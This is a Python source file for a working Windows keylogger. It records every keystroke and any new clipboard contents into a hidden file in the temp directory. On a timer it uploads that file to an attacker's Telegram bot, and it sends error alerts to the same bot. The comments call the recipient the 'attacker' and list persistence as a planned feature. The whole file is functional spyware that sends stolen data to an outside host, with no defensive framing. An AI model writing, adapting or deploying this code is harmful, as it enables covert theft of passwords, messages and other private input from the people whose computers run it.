# _*_ coding: utf-8 _*_

# Windows
# tested on Windows 10

# to do:
# logging keystrokes of virtual keyboard
# persistence



# import modules
from tempfile import gettempdir
from os import system,name
from os.path import isfile,exists
import threading
from pynput import keyboard
from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
from datetime import datetime
from time import sleep
import requests


# <-- Initializing global values -->

# change this
TOKEN = ''                    # Telegram API Token
CHAT_ID = ''                  # Telegram Chat ID
INTERVAL = 60                 # set interval according to your requirement



# Windows
temp_dir = gettempdir()
FILENAME = f'{temp_dir}\\{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'



# to notify attacker if any shits happen
def alarm(msg) -> None :
    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')


#keystroke record
class keylogger:

    # init
    def __init__(self) -> None :
        self.duplicate = ['']

    # saving the file
    def savefile(self,data) -> None :
        try:
            file_exists = isfile(FILENAME)

            with open(FILENAME,'a+') as fh:
                fh.write(str(data))
            
            if not file_exists and name == 'nt':  # check if the system is Windows and file didn't exist before
                system(f'attrib +h {FILENAME}')
        except Exception as e:
            alarm(f'Error: {e}')
    

    def Keylogging(self) -> None :
        def on_key_press(key) -> None :

            def IsDuplicate(data) -> bool :
                    if data and data != self.duplicate[0]:
                        self.duplicate[0] = data
                        return False
                    return True

            try:
                # to get the clipboard data
                data = paste()

                if data and not IsDuplicate(data):
                    self.savefile(f'clipboard data {data}\n')

                # logging the keystrokes
                self.savefile(f'{str(key)}\n')

            except Exception as e:
                alarm(f'Error: {e}')


        try:
            # Create listener objects
            with keyboard.Listener(on_press=on_key_press) as listener:
                listener.join()
        except Exception as e:
            alarm(f"Listener Error: {e}")


    # destructor
    def __del__(self) -> None :
        pass


# send the file to the Telegram at regular interval
class uploader:
    
    # init
    def __init__(self) -> None :
        pass
    
    def upload_file_periodically(self) -> None :
        
        sleep(INTERVAL)
        
        while True:
            try:
                if exists(FILENAME):
                    with open(FILENAME, 'rb') as fh:
                        files = {'document': fh}
                        resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}',files=files)   # sending the file

                        if resp.status_code != 200:
                            alarm(f'Error Code: {resp.status_code}')

                else:
                    alarm(f'File not created or found!')  # file not created/found

                sleep(INTERVAL)

            except Exception as e:
                alarm(f'Error Occured: {e}')

    def __del__(self) -> None :
        pass




if __name__=='__main__':
    try:
        # creating objects
        keylogger  = keylogger()
        uploader = uploader()

        # <---  implementing threading  ---> 
       
        # starting the keylogger and daemon = True (to run it in the background)
        keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
        keylogger_thread.start() 


        # sending file periodically and daemon = True (to run it in the background)
        uploader_thread = threading.Thread(target = uploader.upload_file_periodically, daemon = True)
        uploader_thread.start()


        keylogger_thread.join()
        uploader_thread.join()   
    
    except KeyboardInterrupt:
        pass
